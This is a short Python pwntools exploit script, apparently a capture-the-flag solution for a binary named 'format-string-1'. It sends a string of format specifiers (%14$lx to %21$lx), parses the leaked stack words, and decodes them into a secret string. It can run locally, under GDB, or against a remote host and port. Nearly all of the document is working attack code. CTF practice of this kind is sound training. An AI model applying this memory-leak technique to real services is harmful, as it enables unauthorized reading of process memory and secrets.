#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template format-string-1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'format-string-1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

PAYLOAD = b'.'.join([b'%%%d$lx' % x for x in range(14, 22)])

io = start()

io.sendline(PAYLOAD)

io.readuntil(b"Here's your order: ")
output = io.readline().strip().decode('latin1').split('.')
io.info(output)
output = [bytes.fromhex(x.zfill(16)).decode('latin1')[::-1] for x in output]
io.success(''.join(output))


io.interactive()

